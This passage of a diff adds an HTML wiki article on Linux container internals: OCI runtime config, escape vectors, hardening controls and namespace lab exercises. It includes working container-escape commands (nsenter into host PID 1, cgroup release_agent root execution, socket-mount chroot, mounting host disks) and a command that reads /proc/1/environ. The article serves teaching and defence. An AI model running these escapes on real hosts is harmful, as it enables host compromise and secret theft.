+│      &#34;args&#34;: [&#34;/bin/bash&#34;],                                           │
+│      &#34;env&#34;: [&#34;PATH=/usr/local/sbin:/usr/local/bin:...&#34;],              │
+│      &#34;cwd&#34;: &#34;/&#34;,                                                      │
+│      &#34;capabilities&#34;: {                                                │
+│        &#34;bounding&#34;: [&#34;CAP_CHOWN&#34;, &#34;CAP_DAC_OVERRIDE&#34;, ...],           │
+│        &#34;effective&#34;: [...],                                            │
+│        &#34;permitted&#34;: [...],                                            │
+│        &#34;ambient&#34;: [...]                                               │
+│      },                                                               │
+│      &#34;noNewPrivileges&#34;: true,           ← prevent privilege gain    │
+│      &#34;rlimits&#34;: [...]                                                 │
+│    },                                                                 │
+│    &#34;root&#34;: {                                                          │
+│      &#34;path&#34;: &#34;rootfs&#34;,                   ← root filesystem path      │
+│      &#34;readonly&#34;: true                    ← read-only rootfs          │
+│    },                                                                 │
+│    &#34;mounts&#34;: [                                                       │
+│      {&#34;destination&#34;: &#34;/proc&#34;, &#34;type&#34;: &#34;proc&#34;, ...},                   │
+│      {&#34;destination&#34;: &#34;/dev&#34;, &#34;type&#34;: &#34;tmpfs&#34;, ...},                   │
+│      {&#34;destination&#34;: &#34;/sys&#34;, &#34;type&#34;: &#34;sysfs&#34;, ...}                    │
+│    ],                                                                 │
+│    &#34;linux&#34;: {                                                         │
+│      &#34;namespaces&#34;: [                                                  │
+│        {&#34;type&#34;: &#34;pid&#34;},                                               │
+│        {&#34;type&#34;: &#34;network&#34;},                                           │
+│        {&#34;type&#34;: &#34;mount&#34;},                                             │
+│        {&#34;type&#34;: &#34;ipc&#34;},                                               │
+│        {&#34;type&#34;: &#34;uts&#34;},                                               │
+│        {&#34;type&#34;: &#34;user&#34;, &#34;path&#34;: &#34;/proc/PID/ns/user&#34;}                  │
+│      ],                                                               │
+│      &#34;uidMappings&#34;: [{&#34;containerID&#34;: 0, &#34;hostID&#34;: 1000, &#34;size&#34;: 1}], │
+│      &#34;gidMappings&#34;: [{&#34;containerID&#34;: 0, &#34;hostID&#34;: 1000, &#34;size&#34;: 1}], │
+│      &#34;seccomp&#34;: {&#34;defaultAction&#34;: &#34;SCMP_ACT_ERRNO&#34;},                  │
+│      &#34;resources&#34;: {                                                   │
+│        &#34;memory&#34;: {&#34;limit&#34;: 268435456},                                 │
+│        &#34;cpu&#34;: {&#34;quota&#34;: 50000, &#34;period&#34;: 100000}                      │
+│      },                                                               │
+│      &#34;maskedPaths&#34;: [&#34;/proc/kcore&#34;, &#34;/proc/latency_stats&#34;, ...],       │
+│      &#34;readonlyPaths&#34;: [&#34;/proc/bus&#34;, &#34;/proc/fs&#34;, &#34;/proc/irq&#34;, ...]     │
+│    }                                                                 │
+│  }                                                                   │
+│                                                                      │
+│  Container lifecycle:                                                 │
+│  1. CREATE:   runtime creates namespaces, cgroups, rootfs              │
+│  2. START:   runtime execs the user-specified process                 │
+│  3. RUN:     process executes inside the container                    │
+│  4. STOP:    SIGTERM → wait → SIGKILL                                │
+│  5. DELETE:   runtime removes namespaces, cgroups, unmounts rootfs    │
+└──────────────────────────────────────────────────────────────────────┘
+						</pre>
+					</section>
+					<section>
+						<h3 id="container-escape-techniques">Container Escape Techniques</h3>
+						<p>
+							Understanding escape vectors is essential for building secure containers. Every escape is a
+							failure of namespace, cgroup, or capability isolation.
+						</p>
+						<pre class="plaintext">
+┌──────────────────────────────────────────────────────────────────────┐
+│                     CONTAINER ESCAPE VECTORS                           │
+│                                                                      │
+│  1. Privileged container (--privileged):                              │
+│     ┌─────────────────────────────────────────────────────────┐     │
+│     │  --privileged ≈ --cap-add=ALL + disable seccomp +        │     │
+│     │                + disable AppArmor/SELinux + all devices  │     │
+│     │                                                           │     │
+│     │  Escape via nsenter:                                       │     │
+│     │    nsenter --target 1 --mount --uts --ipc --net --pid bash │     │
+│     │  This enters host PID 1&#39;s namespaces → full host access.  │     │
+│     │                                                           │     │
+│     │  Escape via cgroup release_agent:                          │     │
+│     │    mkdir /tmp/cgrp &amp;&amp; mount -t cgroup -o memory cgrp /tmp │     │
+│     │    echo 1 &gt; /tmp/cgrp/x/notify_on_release                     │     │
+│     │    echo &#39;#!/bin/sh&#39; &gt; /cmd                                    │     │
+│     │    echo &#39;nsenter --target 1 ...&#39; &gt;&gt; /cmd                     │     │
+│     │    echo &#34;/cmd&#34; &gt; /tmp/cgrp/release_agent                      │     │
+│     │    # Trigger: kill last process in cgroup → release_agent   │     │
+│     │    # Executes /cmd on the HOST as root!                     │     │
+│     └─────────────────────────────────────────────────────────┘     │
+│                                                                      │
+│  2. Container socket mount (/run/podman/podman.sock):                  │
+│     - Mounting the container socket inside a container gives API access │
+│     - podman run -v /:/host -it alpine chroot /host                   │
+│     - podman run --privileged --pid=host alpine nsenter ...            │
+│     - Essentially: socket access = full host compromise              │
+│                                                                      │
+│  3. Capability abuse:                                                │
+│     CAP_SYS_ADMIN: mount filesystems, create namespaces,              │
+│                    pivot_root, perform many privileged ops            │
+│     CAP_SYS_PTRACE: trace host processes, inject code                 │
+│     CAP_SYS_MODULE: load arbitrary kernel modules                     │
+│     CAP_NET_RAW: raw sockets, packet injection/sniffing              │
+│     CAP_SYS_RAWIO: iopl/ioperm, direct hardware access                │
+│     CAP_SYS_BOOT: kexec_load — boot new kernel                       │
+│                                                                      │
+│  4. Kernel exploit from container:                                    │
+│     - Container runs with host kernel                                 │
+│     - Any kernel privilege escalation vulnerability = escape          │
+│     - Dirty COW (CVE-2016-5195), Dirty Pipe (CVE-2022-0847)          │
+│     - The kernel doesn&#39;t care which namespace you&#39;re in for exploits  │
+│                                                                      │
+│  5. Procfs/sysfs leak:                                                │
+│     - /proc/sysrq-trigger (if mounted rw): echo b &gt; reboot host       │
+│     - /proc/kcore: read entire host physical memory                   │
+│     - /proc/kallsyms: leak kernel addresses (bypass KASLR)            │
+│     - /sys/kernel/debug: extensive kernel debugging interfaces         │
+│     - /dev/mem, /dev/kmem: direct physical/kernel memory access        │
+│                                                                      │
+│  6. Device node access:                                               │
+│     - Mount host&#39;s /dev in container → access all host block devices  │
+│     - Mount host root partition → mount /dev/sda2 /mnt               │
+│     - Then: chroot /mnt → you&#39;re on the host filesystem               │
+└──────────────────────────────────────────────────────────────────────┘
+						</pre>
+						<h4 id="escape-demonstration">Escape Demonstration</h4>
+						<pre class="bash">
+# WARNING: For educational purposes only on a disposable VM
+
+# Escape scenario 1: Privileged container
+sudo podman run -it --privileged alpine sh
+# Inside container:
+nsenter --target 1 --mount --uts --ipc --net --pid -- bash
+# You are now root on the HOST
+
+# Escape scenario 2: Mounted container runtime socket
+sudo podman run -it -v /run/podman/podman.sock:/run/podman/podman.sock \
+  -v /:/host docker.io/alpine sh
+# Inside container:
+chroot /host bash
+# You have full access to the host filesystem
+
+# Escape scenario 3: Host PID namespace
+sudo podman run -it --pid=host alpine sh
+# Inside container:
+# You can see ALL host processes
+ps aux
+# You can strace/attach to any host process (if capabilities permit)
+
+# Escape scenario 4: CAP_SYS_ADMIN abuse
+sudo podman run -it --cap-add=SYS_ADMIN alpine sh
+# Inside container:
+mkdir /tmp/host_mnt
+mount /dev/sda2 /tmp/host_mnt  # mount host root partition
+ls /tmp/host_mnt               # access host filesystem
+						</pre>
+					</section>
+					<section>
+						<h3 id="container-security-best-practices">Container Security Best Practices</h3>
+						<p>Container security controls:</p>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Control</th>
+									<th align="center">Description</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center">--read-only</td>
+									<td align="center">Mount rootfs read-only. Prevents tampering.</td>
+								</tr>
+								<tr>
+									<td align="center">--no-new-privs</td>
+									<td align="center">Prevents SUID binaries and capability gain.</td>
+								</tr>
+								<tr>
+									<td align="center">--cap-drop=ALL</td>
+									<td align="center">Drop all capabilities first.</td>
+								</tr>
+								<tr>
+									<td align="center">--cap-add=X</td>
+									<td align="center">Add back only needed capabilities.</td>
+								</tr>
+								<tr>
+									<td align="center">--security-opt</td>
+									<td align="center">seccomp profile, AppArmor, SELinux label.</td>
+								</tr>
+								<tr>
+									<td align="center">--user 1000:1000</td>
+									<td align="center">Run as non-root user inside container.</td>
+								</tr>
+								<tr>
+									<td align="center">--userns=auto</td>
+									<td align="center">User namespace remapping (rootless).</td>
+								</tr>
+								<tr>
+									<td align="center">--cgroupns=private</td>
+									<td align="center">Private cgroup namespace.</td>
+								</tr>
+								<tr>
+									<td align="center">--ipc=private</td>
+									<td align="center">Private IPC namespace.</td>
+								</tr>
+								<tr>
+									<td align="center">--pids-limit=100</td>
+									<td align="center">Limit number of processes (fork bomb defense).</td>
+								</tr>
+								<tr>
+									<td align="center">--memory=256m</td>
+									<td align="center">Memory limit (OOM defense).</td>
+								</tr>
+								<tr>
+									<td align="center">--cpu-quota=50000</td>
+									<td align="center">CPU bandwidth limit (noisy neighbor defense).</td>
+								</tr>
+								<tr>
+									<td align="center">--tmpfs /tmp</td>
+									<td align="center">tmpfs for writable areas (no disk spill).</td>
+								</tr>
+								<tr>
+									<td align="center">--device=/dev/X</td>
+									<td align="center">Explicit device access (instead of all devices)</td>
+								</tr>
+							</tbody>
+						</table>
+						<h4 id="secure-container-run-command">Secure container run command</h4>
+						<pre class="bash">
+# Minimal-privilege container (Podman)
+podman run \
+  --read-only \
+  --read-only-tmpfs=true \
+  --no-new-privileges \
+  --cap-drop=ALL \
+  --cap-add=NET_BIND_SERVICE \
+  --security-opt=no-new-privileges \
+  --security-opt=seccomp=/usr/share/containers/seccomp.json \
+  --user=1000:1000 \
+  --userns=keep-id \
+  --cgroupns=private \
+  --ipc=private \
+  --pids-limit=100 \
+  --memory=256m \
+  --cpu-quota=50000 \
+  --tmpfs /tmp:rw,noexec,nosuid,size=64M \
+  --tmpfs /var/tmp:rw,noexec,nosuid,size=64M \
+  docker.io/nginx:latest
+						</pre>
+					</section>
+					<section>
+						<h3 id="challenge">Challenge</h3>
+						<p>
+							Build the escape lab container and reproduce the namespace isolation checks by hand. The lab
+							prints the namespace inodes, capability mask, cgroup membership, and overlay mounts of the container
+							it runs in, then walks through the escape vectors that a weak configuration exposes.
+						</p>
+						<p><a href="/wiki/articles/sysinternals/containers-internals.Containerfile">containers-internals.Containerfile</a></p>
+						<pre class="bash">
+podman build -t container-escape-lab -f containers-internals.Containerfile .
+podman run --rm container-escape-lab
+						</pre>
+						<p>Run the same checks against the host to compare:</p>
+						<pre class="bash">
+# 1. List all namespaces on the system
+sudo lsns
+sudo lsns -t pid,mnt,net,uts,ipc,user,cgroup,time
+
+# 2. Inspect current process&#39;s namespaces
+ls -la /proc/self/ns/
+readlink /proc/self/ns/*
+
+# 3. Create a PID namespace and observe isolation
+sudo unshare --pid --fork --mount-proc bash
+# Inside: echo $$ (shows 1)
+# Inside: ps aux (shows only NS processes)
+# Exit: exit
+
+# 4. Create a mount namespace
+sudo unshare --mount bash
+mount -t tmpfs tmpfs /tmp
+echo &#34;isolated&#34; &gt; /tmp/ns_test
+# In another terminal: ls /tmp/ns_test (file not visible)
+exit
+
+# 5. Create a network namespace
+sudo ip netns add demo_ns
+sudo ip netns exec demo_ns ip link show
+# Shows only loopback — fully isolated network
+sudo ip netns delete demo_ns
+
+# 6. Inspect container&#39;s namespace and cgroup configuration
+podman run -d --name test_cg docker.io/alpine sleep 3600
+podman inspect test_cg | jq &#39;.[0].HostConfig&#39;
+
+# 7. View cgroup v2 hierarchy for a container
+cat /proc/self/cgroup
+sudo cat /sys/fs/cgroup/system.slice/.../memory.current
+sudo cat /sys/fs/cgroup/system.slice/.../pids.current
+
+# 8. Check container&#39;s capabilities
+podman inspect test_cg | jq &#39;.[0].EffectiveCaps&#39;
+podman inspect test_cg | jq &#39;.[0].Config.User&#39;
+
+# 9. Overlay filesystem inspection
+sudo cat /proc/self/mountinfo | grep overlay
+
+# 10. Seccomp profile check
+podman inspect test_cg | jq &#39;.[0].HostConfig.SecurityOpt&#39;
+
+# 11. Check if running rootless
+podman info | grep -i rootless
+
+# 12. User namespace mapping
+cat /etc/subuid
+cat /etc/subgid
+podman unshare cat /proc/self/uid_map
+
+# 13. Simulate container escape paths (educational)
+# Privileged mode risks:
+podman run --rm --privileged alpine cat /proc/1/environ
+# Host PID namespace risks:
+podman run --rm --pid=host alpine ps aux
+
+# Cleanup
+podman stop test_cg &amp;&amp; podman rm test_cg
+						</pre>
+					</section>
+					<section>
+						<h3 id="references">References</h3>
+						<ul>
+							<li><a class="icon-website" href="https://man.archlinux.org/man/namespaces.7" target="_blank">Linux kernel: namespaces(7) man page</a></li>
+							<li><a class="icon-website" href="https://man.archlinux.org/man/cgroups.7" target="_blank">Linux kernel: cgroups(7) man page</a></li>
+							<li><a class="icon-website" href="https://man.archlinux.org/man/user_namespaces.7" target="_blank">Linux kernel: user_namespaces(7) man page</a></li>
+							<li><a class="icon-website" href="https://man.archlinux.org/man/capabilities.7" target="_blank">Linux kernel: capabilities(7) man page</a></li>
+							<li><a class="icon-website" href="https://man.archlinux.org/man/mount_namespaces.7" target="_blank">Linux kernel: mount_namespaces(7) man page</a></li>
+							<li><a class="icon-website" href="https://man.archlinux.org/man/pid_namespaces.7" target="_blank">Linux kernel: pid_namespaces(7) man page</a></li>
+							<li><a class="icon-website" href="https://elixir.bootlin.com/linux/latest/source/kernel/nsproxy.c" target="_blank">Linux kernel: kernel/nsproxy.c - namespace proxy</a></li>
+							<li><a class="icon-website" href="https://elixir.bootlin.com/linux/latest/source/fs/overlayfs" target="_blank">Linux kernel: fs/overlayfs/ - overlay filesystem</a></li>
+							<li><a class="icon-website" href="https://elixir.bootlin.com/linux/latest/source/kernel/cgroup" target="_blank">Linux kernel: kernel/cgroup/ - cgroups implementation</a></li>
+							<li><a class="icon-github" href="https://github.com/opencontainers/runtime-spec/blob/v1.1.0/spec.md" target="_blank">OCI Runtime Specification v1.1.0</a></li>
+							<li><a class="icon-github" href="https://github.com/opencontainers/image-spec" target="_blank">OCI Image Format Specification</a></li>
+							<li><a class="icon-website" href="https://docs.podman.io/en/latest/markdown/podman-run.1.html#security" target="_blank">Podman Security Documentation</a></li>
+							<li><a class="icon-website" href="https://nvd.nist.gov/vuln/detail/CVE-2019-5736" target="_blank">CVE-2019-5736 (runc container escape)</a></li>
+							<li><a class="icon-website" href="https://nvd.nist.gov/vuln/detail/CVE-2022-0847" target="_blank">CVE-2022-0847 (Dirty Pipe - container escape)</a></li>
+							<li><a class="icon-website" href="https://man.archlinux.org/man/nsenter.1" target="_blank">nsenter(1) man page</a></li>
+							<li><a class="icon-website" href="https://man.archlinux.org/man/unshare.1" target="_blank">unshare(1) man page</a></li>
+							<li><a class="icon-website" href="https://man.archlinux.org/man/lsns.8" target="_blank">lsns(8) man page</a></li>
+						</ul>
+					</section>
+				</article>
+			</main>
+		</div>
+
+		<footer>
+			<div></div>
+			<div class="print-not">Made with 💔 in Germany. &copy; Cookie Engineer (https://cookie.engineer). All rights (and jokes) reserved under European Law.</div>
+			<div></div>
+		</footer>
+
+	</body>
+</html>
